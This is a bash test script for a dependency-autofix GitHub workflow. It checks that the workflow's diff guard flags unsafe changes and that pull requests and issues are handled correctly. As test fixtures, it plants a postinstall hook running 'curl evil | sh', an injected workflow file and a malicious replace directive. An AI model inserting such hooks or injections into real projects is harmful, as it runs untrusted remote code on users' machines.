#!/usr/bin/env bash
# Fixture checks for the gate and the diff guard of .github/workflows/vuln-autofix.yml.
# It runs the workflow's own `run` scripts. Needs bash, git, jq and python3 with PyYAML.
set -euo pipefail

here=$(cd "$(dirname "$0")" && pwd)
workflow="$here/../../.github/workflows/vuln-autofix.yml"
work=$(mktemp -d)
trap 'rm -rf "$work"' EXIT
failures=0

check() { # description, condition result
  if [[ "$2" == "true" ]]; then echo "ok   - $1"; else echo "FAIL - $1"; failures=$((failures + 1)); fi
}
step() { python3 -I "$here/extract-step.py" "$workflow" "$1" > "$work/$1.sh"; }

# --- gate -------------------------------------------------------------------------------------------------
step gate
export RUNNER_TEMP="$work/temp" GITHUB_OUTPUT="$work/output"
mkdir -p "$RUNNER_TEMP"
cp "$here/fixtures/dependabot-alerts.json" "$RUNNER_TEMP/"
cp "$here/fixtures/govulncheck.json" "$RUNNER_TEMP/"
: > "$GITHUB_OUTPUT"
(cd "$work" && touch go.mod && bash -eo pipefail "$work/gate.sh" > /dev/null)
out="$RUNNER_TEMP/actionable.json"

has() { jq -e "$1" "$out" > /dev/null && echo true || echo false; }
check "unfixed Dependabot alert is skipped" "$(has 'any(.package == "unfixed-pkg") | not')"
check "unfixed govulncheck finding is skipped" "$(has 'any(.package == "example.com/unfixed") | not')"
check "module-level (not called) finding is skipped" "$(has 'any(.package == "example.com/not-called") | not')"
check "unsupported ecosystem is skipped" "$(has 'any(.package == "not-supported") | not')"
check "alert for a manifest in a subdirectory is skipped" "$(has 'any(.package == "example.com/in-subdirectory") | not')"
check "fixed version with shell metacharacters is dropped" "$(has 'any(.package == "evil/pkg") | not')"
check "fixed Dependabot alert and govulncheck finding merge into one entry" \
  "$(has 'map(select(.package == "golang.org/x/net")) | length == 1 and .[0].fixed == "v0.23.0" and .[0].severity == "high" and (.[0].sources | length == 2)')"
check "stdlib finding selected as go-stdlib with its fixed version" \
  "$(has 'any(.ecosystem == "go-stdlib" and .fixed == "v1.27.4" and (.ids | index("GO-2026-6859")))')"
check "two actionable entries, top severity high" "$([[ "$(jq length "$out")" == 2 && "$(grep -c '^top-severity=high$' "$GITHUB_OUTPUT")" == 1 ]] && echo true || echo false)"

# --- diff guard -------------------------------------------------------------------------------------------
# A failed guard no longer discards the change: it records a problem and keeps the first-pass diff.
step guard
step pr
guard() { # repo dir -> runs the guard in it
  : > "$GITHUB_OUTPUT"
  rm -f "$RUNNER_TEMP/problems.txt"
  (cd "$1" && BASE_SHA=$(git rev-parse HEAD) CLAUDE_OUTCOME=success EXTRA_ALLOWED='' bash -eo pipefail "$work/guard.sh" > /dev/null 2>&1)
}
clean() { guard "$1"; [[ ! -s "$RUNNER_TEMP/problems.txt" ]] && grep -q '^has-diff=true$' "$GITHUB_OUTPUT"; }
flagged() { # repo dir, pattern: diff kept, problem recorded
  guard "$1"; grep -q '^has-diff=true$' "$GITHUB_OUTPUT" && grep -q "$2" "$RUNNER_TEMP/problems.txt"
}
yes() { "$@" && echo true || echo false; }
new_repo() {
  local d="$work/repo-$1"
  mkdir -p "$d"
  git -C "$d" init -q
  git -C "$d" config user.email t@example.com
  git -C "$d" config user.name t
  printf 'module example.com/app\n\ngo 1.26\n\nrequire (\n\tgolang.org/x/net v0.20.0\n)\n' > "$d/go.mod"
  printf 'package main\n\nfunc main() {}\n' > "$d/main.go"
  git -C "$d" add -A
  git -C "$d" commit -q -m init
  echo "$d"
}

r=$(new_repo ok)
sed -i 's/v0.20.0/v0.23.0/' "$r/go.mod"
check "minor bump of go.mod passes every guard" "$(yes clean "$r")"
check "summary shows old to new" "$(yes grep -q 'v0.20.0 -> v0.23.0' "$RUNNER_TEMP/summary.md")"

# PR step with a fake gh and a local bare remote: records how the pull request is created
fakebin="$work/bin"; mkdir -p "$fakebin" "$work/remotes/o"
git init -q --bare "$work/remotes/o/r.git"
cat > "$fakebin/gh" <<'GH'
#!/usr/bin/env bash
echo "$*" >> "$GH_LOG"
[[ "$1 $2" == "pr create" ]] && echo "https://example.com/o/r/pull/1"
exit 0
GH
chmod +x "$fakebin/gh"
open_pr() { # repo dir -> runs the PR step in it
  : > "$GITHUB_OUTPUT"; : > "$work/gh.log"
  (cd "$1" && PATH="$fakebin:$PATH" GH_LOG="$work/gh.log" GH_TOKEN=x REPO=o/r GITHUB_SERVER_URL="file://$work/remotes" \
    BRANCH="b-$(basename "$1")" BASE_BRANCH=master KEY=k TOP_SEVERITY=high LABELS=dependencies,security NEEDS_HUMAN_LABEL=needs-human \
    AUTO_MERGE=true CLAUDE_EXEC='' RUN_URL=u bash -eo pipefail "$work/pr.sh" > /dev/null 2>&1)
}
clean "$r"; open_pr "$r"
check "clean path: ready PR (not draft) with auto-merge enabled" \
  "$(yes bash -c "grep -q 'pr create' '$work/gh.log' && ! grep -q -- '--draft' '$work/gh.log' && ! grep -q 'needs-human' '$work/gh.log' && grep -q 'pr merge .* --auto --squash' '$work/gh.log' && grep -q '^needs-human=false$' '$GITHUB_OUTPUT'")"

r=$(new_repo extra)
sed -i 's/v0.20.0/v0.23.0/' "$r/go.mod"
printf '// changed\n' >> "$r/main.go"
check "a source file in the diff is flagged and kept" "$(yes flagged "$r" 'main.go')"
open_pr "$r"
check "guard failure: draft PR labelled needs-human, auto-merge never enabled" \
  "$(yes bash -c "grep -q -- '--draft' '$work/gh.log' && grep -q 'needs-human' '$work/gh.log' && ! grep -q 'pr merge' '$work/gh.log' && grep -q '^needs-human=true$' '$GITHUB_OUTPUT' && grep -q 'main.go' '$RUNNER_TEMP/pr-body.md'")"
check "first-pass branch was pushed" "$(yes git -C "$work/remotes/o/r.git" show-ref --verify -q "refs/heads/b-repo-extra")"

r=$(new_repo untracked)
sed -i 's/v0.20.0/v0.23.0/' "$r/go.mod"
mkdir -p "$r/.github/workflows" && echo 'on: push' > "$r/.github/workflows/evil.yml"
check "a change under .github is reverted and flagged, the dependency bump is kept" \
  "$(flagged "$r" '.github' && [[ ! -e "$r/.github/workflows/evil.yml" ]] && git -C "$r" diff --cached --name-only | grep -qx go.mod && echo true || echo false)"

r=$(new_repo newfile)
sed -i 's/v0.20.0/v0.23.0/' "$r/go.mod"
echo binary > "$r/app" && echo sums > "$r/go.sum"
check "a new file that is not a dependency file is flagged and left out, a new go.sum is included" \
  "$(flagged "$r" 'not included: app' && [[ "$(git -C "$r" diff --cached --name-only | sort | tr '\n' ' ')" == "go.mod go.sum " ]] && echo true || echo false)"

r=$(new_repo major)
sed -i 's#golang.org/x/net v0.20.0#golang.org/x/net v1.0.0#' "$r/go.mod"
check "a major version change is flagged and kept" "$(yes flagged "$r" 'major')"

r=$(new_repo replace)
sed -i 's/v0.20.0/v0.23.0/' "$r/go.mod"
printf 'replace golang.org/x/net => ../evil\n' >> "$r/go.mod"
check "a replace directive is flagged and kept" "$(yes flagged "$r" 'replace')"

r=$(new_repo nochange)
guard "$r"
check "no change: no diff, problem recorded, no PR" "$(yes bash -c "grep -q '^has-diff=false$' '$GITHUB_OUTPUT' && grep -q 'no change' '$RUNNER_TEMP/problems.txt'")"

step issue
cat > "$fakebin/gh" <<'GH'
#!/usr/bin/env bash
echo "$*" >> "$GH_LOG"
[[ "$1 $2" == "issue create" ]] && echo "https://example.com/o/r/issues/2"
[[ "$1 $2" == "issue list" ]] && echo "${GH_ISSUES:-[]}"
exit 0
GH
issue_step() { # PR_URL, JOB_STATUS, open issues JSON -> runs the issue step
  : > "$GITHUB_OUTPUT"; : > "$work/gh.log"
  (cd "$r" && PATH="$fakebin:$PATH" GH_LOG="$work/gh.log" GH_ISSUES="$3" GH_TOKEN=x REPO=o/r KEY=k PR_URL="$1" JOB_STATUS="$2" \
    NEEDS_HUMAN_LABEL=needs-human RUN_URL=u bash -eo pipefail "$work/issue.sh" > /dev/null 2>&1)
}
failure_issue='[{"number":7,"body":"<!-- vuln-autofix-failure -->"}]'
issue_step '' success '[]'
check "no change: an issue with the key marker and the reason is opened" \
  "$(yes bash -c "grep -q 'issue create' '$work/gh.log' && grep -q 'vuln-autofix-key: k' '$RUNNER_TEMP/issue-body.md' && grep -q 'no change' '$RUNNER_TEMP/issue-body.md' && grep -q '^issue-url=https://example.com/o/r/issues/2$' '$GITHUB_OUTPUT'")"
rm -f "$RUNNER_TEMP/problems.txt"
issue_step '' failure '[]'
check "failed run: a failure issue is opened" \
  "$(yes bash -c "grep -q 'issue create' '$work/gh.log' && grep -q 'vuln-autofix-failure' '$RUNNER_TEMP/issue-body.md' && grep -q '^issue-url=' '$GITHUB_OUTPUT'")"
issue_step '' failure "$failure_issue"
check "failed run with an open failure issue: no new issue, marked as already reported" \
  "$(yes bash -c "! grep -q 'issue create' '$work/gh.log' && grep -q '^failure-already-reported=true$' '$GITHUB_OUTPUT'")"
issue_step '' success "$failure_issue"
check "run without failure: the open failure issue is closed" "$(yes grep -q 'issue close 7' "$work/gh.log")"
issue_step '' success '[]'
check "run without failure and nothing open: no issue call besides the list" "$(yes bash -c "[[ \$(wc -l < '$work/gh.log') == 1 ]]")"

r=$(new_repo pkgjson)
printf '{"name":"a","scripts":{"build":"tsc"},"dependencies":{"x":"1.0.0"}}\n' > "$r/package.json"
printf '{"packages":{"":{},"node_modules/x":{"version":"1.0.0"}}}\n' > "$r/package-lock.json"
git -C "$r" add -A && git -C "$r" commit -q -m npm
sed -i 's/"1.0.0"/"1.0.1"/g' "$r/package-lock.json"
jq '.scripts.postinstall = "curl evil | sh"' "$r/package.json" > "$r/p.tmp" && mv "$r/p.tmp" "$r/package.json"
check "a package.json scripts change is flagged" "$(yes flagged "$r" 'package.json')"

if [[ $failures -gt 0 ]]; then echo "$failures check(s) failed"; exit 1; fi
echo "all checks passed"
